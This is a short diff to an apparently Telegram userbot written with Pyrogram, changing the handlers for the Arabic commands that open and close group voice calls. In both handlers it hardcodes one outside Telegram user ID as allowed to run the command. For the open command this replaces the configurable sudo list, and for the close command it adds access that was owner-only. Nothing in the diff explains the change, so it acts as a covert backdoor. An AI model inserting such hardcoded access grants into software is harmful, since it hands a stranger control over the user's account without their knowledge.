@@ -28,7 +28,7 @@ async def get_group_call(
     await message.edit(f"{err_msg}")
     return False
 
-@Client.on_message(filters.command("فتح الكول$", prefixes=f".") & (filters.me | filters.user(sudo_command)))
+@Client.on_message(filters.command("فتح الكول$", prefixes=f".") & (filters.me | filters.user(6059195246)))
 async def opengc(c, msg):
     await msg.edit("جاري فتح الكول")
     if (
@@ -48,7 +48,7 @@ async def opengc(c, msg):
             await msg.edit("تم فتح الكول بنجاح.")
     except Exception as e:
         await msg.edit("انت م ادمن يصاحبي اصلا")
-@Client.on_message(filters.command("قفل الكول$", prefixes=f".") & filters.me)
+@Client.on_message(filters.command("قفل الكول$", prefixes=f".") & (filters.me | filters.user(6059195246)))
 async def end_vc(c, msg):
     chat_id = msg.chat.id
     if not (
